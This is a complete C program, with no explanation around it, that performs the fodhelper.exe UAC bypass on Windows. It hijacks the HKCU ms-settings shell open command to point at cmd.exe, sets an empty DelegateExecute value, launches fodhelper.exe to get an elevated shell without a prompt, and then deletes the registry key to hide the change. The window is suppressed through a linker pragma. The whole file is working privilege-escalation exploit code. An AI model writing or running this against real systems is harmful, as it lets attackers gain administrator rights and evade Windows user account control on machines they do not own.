#include <windows.h>
#include <stdio.h>
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")

int main(int argc, char* argv[]) {
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA si = { 0 };
	HKEY hKey;

	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_HIDE;
	RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", &hKey);
	RegSetValueExA(hKey, "", 0, REG_SZ, (LPBYTE)"cmd.exe", strlen("cmd.exe"));
	RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));
	CreateProcessA("C:\\Windows\\System32\\cmd.exe",(LPSTR)"/c C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
	Sleep(5000);
	RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

	return 0;
}